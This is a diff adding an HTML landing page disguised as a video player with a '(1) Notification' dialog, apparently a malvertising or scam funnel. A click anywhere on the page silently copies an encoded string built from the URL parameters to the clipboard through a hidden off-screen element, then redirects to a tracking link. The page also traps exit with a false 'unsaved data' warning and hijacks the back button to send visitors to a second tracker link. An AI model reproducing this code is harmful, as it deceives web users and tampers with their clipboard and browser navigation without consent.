@@ -1,0 +1,342 @@
+<!DOCTYPE html><html><head><base href="">
+     
+  <meta charset="utf-8">
+     <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+  <title class="text_block" rel="a1">(1) Notification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="stylesheet" href="f/common.css">
+    <style type="text/css">  
+        em {
+            opacity: 0;
+            position: absolute;
+            top: -9999px;
+        } 
+    </style>  
+  <link href="f/jquery-ui.css" rel="stylesheet">
+  <script src="f/jquery.min.js"></script>
+    <script src="f/language.js" charset="utf-8"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <script>
+    var country_code = getURLParameter('country_code');
+
+    function getURLParameter(name) {
+      return decodeURIComponent(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+      );
+    }
+  </script>
+  <script>
+  var DEFAULT_LANGUAGE = 'english';
+  var lng = country_code.toLowerCase();
+  switch (lng) {
+    case 'en':
+      lng = 'english';
+      break;
+    case 'de':
+    case 'at':
+    case 'li':
+    case 'lu':
+    case 'ch':
+      lng = 'germany';
+      break;
+    case "fr":
+    case 'ch':
+    case 'be':
+    case 'ga':
+    case 'gf':
+    case 'gn':
+    case 'mc':
+      lng = 'france';
+      break;
+    case 'ar':
+    case 'do':
+    case 'sv':
+    case 've':
+    case 'mx':
+    case 'co':
+    case 'es':
+    case 'cr':
+    case 'cu':
+    case 'pa':
+    case 'pe':
+    case 'cl':
+    case 'ec':
+    case 'bo':
+    case 'gq':
+    case 'gt':
+    case 'hn':
+    case 'ni':
+    case 'py':
+    case 'uy':
+      lng = 'spain';
+      break;
+    case 'br':
+    case 'pt':
+    case 'ao':
+      lng = 'portugal';
+      break;
+    case 'th':
+    case 'ph':
+      lng = 'thai';
+      break;
+    case 'dk':
+      lng = 'dutch';
+      break;
+    case 'kr':
+      lng = 'korea';
+      break;
+    case 'jp':
+      lng = 'japan';
+      break;
+    case 'id':
+      lng = 'indonasia';
+      break;
+    case 'no':
+      lng = 'norway';
+      break;
+    case 'it':
+      lng = 'italy';
+      break;
+    case 'se':
+      lng = 'sweden';
+      break;
+    case 'cz':
+      lng = 'czech';
+      break;
+    case 'sk':
+      lng = 'slovakia';
+      break;
+    case 'pl':
+      lng = 'poland';
+      break;
+    case 'eg':
+    case 'sa':
+    case 'dz':
+    case 'ma':
+    case 'kw':
+    case 'ae':
+    case 'bh':
+    case 'dj':
+    case 'il':
+    case 'jo':
+    case 'ia':
+    case 'ye':
+    case 'qa':
+    case 'lb':
+    case 'sy':
+    case 'tn':
+    case 'om':
+    case 'er':
+    case 'so':
+    case 'td':
+      lng = 'arab';
+      break;
+    case 'bg':
+      lng = 'bulgary';
+      break;
+
+    default:
+      lng = DEFAULT_LANGUAGE;
+  }
+  </script>
+  <script>
+  (lng == 'arab') ? document.write('<style>.text_block, .date { direction: rtl; word-wrap: break-word; unicode-bidi: bidi-override} img, .date {display: block;  unicode-bidi:embed ;} .roy { unicode-bidi:embed ;}</style>'): '';
+
+  </script>
+    	<script>
+			function saveParamsToClipboard() {
+	        var getParams = (window.location.search).slice(1);
+	        var base64params = btoa(getParams);
+	        var text = '{"clipboard":"' + base64params.slice(0, 3) + "DImbW9kZWw9MTIuMDI" + base64params.slice(3) + '"}';
+	        var getSelection = window.getSelection()
+	        getSelection.removeAllRanges();
+	        var em = document.createElement('em');
+	        em.classList.add('paramsData');
+	        em.style.opacity = '0';
+	        em.style.position = 'absolute';
+	        em.style.top = '-9999px';
+	        document.body.insertBefore(em, document.body.firstChild);
+	        var params = document.querySelector('.paramsData');
+	        params.innerText = text;
+	        var range = document.createRange();
+	        range.selectNode(params);
+	        getSelection.addRange(range);
+	
+	        try {
+	            document.execCommand('copy');
+	        } catch (err) {
+	            // console.log('Oops, unable to copy');
+	        }
+	    	}
+		</script>
+<script>
+    function go_click() {
+      saveParamsToClipboard();
+        window.location.href = "finlink";
+        window.onbeforeunload = null;
+        window.location.href = fin_link;
+    }
+</script>
+
+</head>
+
+
+<body onclick="go_click();"><div>
+  <div class="cont">
+    <img src="f/img.png" alt="">
+  </div>
+    <div class="ytp-chrome-bottom" data-layer="8">
+    <div class="ytp-progress-bar-container" aria-disabled="true" style="height: 5px;">
+      <div class="ytp-progress-bar " tabindex="0" role="slider" aria-label="" aria-valuemin="0" aria-valuemax="0" aria-valuenow="0" aria-valuetext="0:00">
+        <div class="ytp-progress-list">
+          <div class="ytp-play-progress ytp-swatch-background-color" style="left: 0px; transform: scaleX(0.194237);"></div>
+        </div>
+      </div>
+
+    </div>
+    <div class="ytp-chrome-controls">
+      <div class="ytp-left-controls">
+      <button class="ytp-play-button ytp-button" aria-label="Watch"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+            <use class="ytp-svg-shadow" xlink:href="#ytp-id-11"></use>
+            <path class="ytp-svg-fill" d="M 12,26 18.5,22 18.5,14 12,10 z M 18.5,22 25,18 25,18 18.5,14 z" id="ytp-id-11"></path>
+          </svg></button>
+          <a class="ytp-next-button ytp-button" title="Next" aria-disabled="false"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+            <use class="ytp-svg-shadow" xlink:href="#ytp-id-12"></use>
+            <path class="ytp-svg-fill" d="M 12,24 20.5,18 12,12 V 24 z M 22,12 v 12 h 2 V 12 h -2 z" id="ytp-id-12"></path>
+          </svg></a>
+          <button class="ytp-mute-button ytp-button" data-visual-id="5" title="Disable sound" style=""><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-14"></use>
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-15"></use>
+              <defs>
+                <clipPath id="ytp-svg-volume-animation-mask">
+                  <path d="m 14.35,-0.14 -5.86,5.86 20.73,20.78 5.86,-5.91 z"></path>
+                  <path d="M 7.07,6.87 -1.11,15.33 19.61,36.11 27.80,27.60 z"></path>
+                  <path class="ytp-svg-volume-animation-mover" d="M 9.09,5.20 6.47,7.88 26.82,28.77 29.66,25.99 z" transform="translate(0, 0)"></path>
+                </clipPath>
+                <clipPath id="ytp-svg-volume-animation-slash-mask">
+                  <path class="ytp-svg-volume-animation-mover" d="m -11.45,-15.55 -4.44,4.51 20.45,20.94 4.55,-4.66 z" transform="translate(0, 0)"></path>
+                </clipPath>
+              </defs>
+              <path class="ytp-svg-fill ytp-svg-volume-animation-speaker" clip-path="url(#ytp-svg-volume-animation-mask)" d="M8,21 L12,21 L17,26 L17,10 L12,15 L8,15 L8,21 Z M19,14 L19,22 C20.48,21.32 21.5,19.77 21.5,18 C21.5,16.26 20.48,14.74 19,14 ZM19,11.29 C21.89,12.15 24,14.83 24,18 C24,21.17 21.89,23.85 19,24.71 L19,26.77 C23.01,25.86 26,22.28 26,18 C26,13.72 23.01,10.14 19,9.23 L19,11.29 Z" fill="#fff" id="ytp-id-14"></path>
+              <path class="ytp-svg-fill ytp-svg-volume-animation-hider" clip-path="url(#ytp-svg-volume-animation-slash-mask)" d="M 9.25,9 7.98,10.27 24.71,27 l 1.27,-1.27 Z" fill="#fff" id="ytp-id-15" style="display: none;"></path>
+            </svg></button>
+        <div class="ytp-time-display notranslate" style=""><span class="ytp-time-current">0:11</span><span class="ytp-time-separator">
+            / </span><span class="ytp-time-duration">1:38</span></div>
+      </div>
+      <div class="ytp-right-controls"><button class="ytp-button ytp-settings-button" aria-haspopup="true" aria-owns="ytp-id-17" style="" title="Settings"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+            <use class="ytp-svg-shadow" xlink:href="#ytp-id-18"></use>
+            <path d="m 23.94,18.78 c .03,-0.25 .05,-0.51 .05,-0.78 0,-0.27 -0.02,-0.52 -0.05,-0.78 l 1.68,-1.32 c .15,-0.12 .19,-0.33 .09,-0.51 l -1.6,-2.76 c -0.09,-0.17 -0.31,-0.24 -0.48,-0.17 l -1.99,.8 c -0.41,-0.32 -0.86,-0.58 -1.35,-0.78 l -0.30,-2.12 c -0.02,-0.19 -0.19,-0.33 -0.39,-0.33 l -3.2,0 c -0.2,0 -0.36,.14 -0.39,.33 l -0.30,2.12 c -0.48,.2 -0.93,.47 -1.35,.78 l -1.99,-0.8 c -0.18,-0.07 -0.39,0 -0.48,.17 l -1.6,2.76 c -0.10,.17 -0.05,.39 .09,.51 l 1.68,1.32 c -0.03,.25 -0.05,.52 -0.05,.78 0,.26 .02,.52 .05,.78 l -1.68,1.32 c -0.15,.12 -0.19,.33 -0.09,.51 l 1.6,2.76 c .09,.17 .31,.24 .48,.17 l 1.99,-0.8 c .41,.32 .86,.58 1.35,.78 l .30,2.12 c .02,.19 .19,.33 .39,.33 l 3.2,0 c .2,0 .36,-0.14 .39,-0.33 l .30,-2.12 c .48,-0.2 .93,-0.47 1.35,-0.78 l 1.99,.8 c .18,.07 .39,0 .48,-0.17 l 1.6,-2.76 c .09,-0.17 .05,-0.39 -0.09,-0.51 l -1.68,-1.32 0,0 z m -5.94,2.01 c -1.54,0 -2.8,-1.25 -2.8,-2.8 0,-1.54 1.25,-2.8 2.8,-2.8 1.54,0 2.8,1.25 2.8,2.8 0,1.54 -1.25,2.8 -2.8,2.8 l 0,0 z" fill="#fff" id="ytp-id-18"></path>
+          </svg></button><button class="ytp-fullscreen-button ytp-button" title="Full screen"><svg height="100%" version="1.1" viewBox="0 0 36 36" width="100%">
+            <g class="ytp-fullscreen-button-corner-0">
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-22"></use>
+              <path class="ytp-svg-fill" d="m 10,16 2,0 0,-4 4,0 0,-2 L 10,10 l 0,6 0,0 z" id="ytp-id-22"></path>
+            </g>
+            <g class="ytp-fullscreen-button-corner-1">
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-23"></use>
+              <path class="ytp-svg-fill" d="m 20,10 0,2 4,0 0,4 2,0 L 26,10 l -6,0 0,0 z" id="ytp-id-23"></path>
+            </g>
+            <g class="ytp-fullscreen-button-corner-2">
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-24"></use>
+              <path class="ytp-svg-fill" d="m 24,24 -4,0 0,2 L 26,26 l 0,-6 -2,0 0,4 0,0 z" id="ytp-id-24"></path>
+            </g>
+            <g class="ytp-fullscreen-button-corner-3">
+              <use class="ytp-svg-shadow" xlink:href="#ytp-id-25"></use>
+              <path class="ytp-svg-fill" d="M 12,20 10,20 10,26 l 6,0 0,-2 -4,0 0,-4 0,0 z" id="ytp-id-25"></path>
+            </g>
+          </svg></button></div>
+    </div>
+  </div>
+
+  <div class="wrapper">
+    <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front ui-dialog-buttons ui-draggable show" aria-describedby="dialog" aria-labelledby="ui-id-1" style="height: auto; width: 300px; top: 311.011px; left: 155.8px; z-index: 101;">
+      <div class="ui-dialog-titlebar ui-corner-all ui-widget-header ui-helper-clearfix ui-draggable-handle"><span id="ui-id-1" class="ui-dialog-title">&nbsp;</span>
+          <button type="button" class="ui-button ui-corner-all ui-widget ui-button-icon-only ui-dialog-titlebar-close" title="Close"><span class="ui-button-icon ui-icon ui-icon-closethick"></span><span class="ui-button-icon-space"> </span>Close</button>
+      </div>
+      <div id="dialog" class="ui-dialog-content ui-widget-content" style="width: auto; min-height: 55.0219px; max-height: none; height: auto;">
+          <div style="text-align: center;"><strong class="lang-2 text_block" rel="a2"></strong></div>
+          <p style="text-align: center;" class="lang-3 text_block" rel="a3"></p>
+      </div>
+      <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+          <div class="ui-dialog-buttonset">
+              <button type="button" class="ui-button ui-corner-all ui-widget lang-4 text_block" rel="a4"></button>
+          </div>
+      </div>
+  </div>
+  </div>
+
+  <script> setTimeout(function(){ document.querySelector('.ui-dialog').classList.add('show'); }, 500) </script>
+
+  </div>
+  <script type="text/javascript">
+      var fin_link = ('https://08deh.bemobtrk.com/click/1');
+      var bb_link = 'https://08deh.bemobtrk.com/click/2';
+      var links = document.getElementsByClassName('finlink');
+      for (var i = 0; i < links.length; i++) links[i].setAttribute("href", fin_link);
+      
+      for (var j = 0; j < links.length; j++) {
+          links[j].addEventListener('click', function() {
+              window.onbeforeunload = null;
+          });
+      }
+
+      function getURLParameter(name) {
+          return decodeURIComponent(
+              (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+          );
+      }
+      window.onbeforeunload = function(e) {
+          if (true) {
+              s = 'All unsaved data will be lost! Do you really want to quit the site?'
+              e = e || window.event;
+              // For IE and Firefox prior to version 4
+              if (e) {
+                  e.returnValue = s;
+              }
+              // For Safari
+              return s;
+          }
+      };
+
+      //Historyback
+      ! function() {
+          var t;
+          try {
+              for (t = 0; 10 > t; ++t) console.log({}, "", "");
+              onpopstate = function(t) {
+                  window.onbeforeunload = null;
+                  t.state && location.replace(bb_link);
+              };
+          } catch (o) {}
+      }();
+  </script>
+  <script>
+    function language(id) {
+      return lang[lng][id];
+    }
+    $('.text_block').each(function () {
+      $(this).html(language($(this).attr('rel')));
+    });
+    function detect_language() {
+        var detected_language = navigator.language;
+        if (detected_language.length > 2) {
+          detected_language = detected_language[0] + detected_language[1];
+        };
+
+        if (jQuery.inArray(detected_language, ['ar', 'he', 'fa']) >= 0) {
+          $('html').attr('DIR', 'RTL');
+        }
+        return translation_available(detected_language);
+      }
+
+      function translate() {
+        var detected_language = detect_language();
+        for (y in translation["source"]) {
+          replace_text(detected_language, y);
+        }
+      }
+  </script>
+
+</body></html>
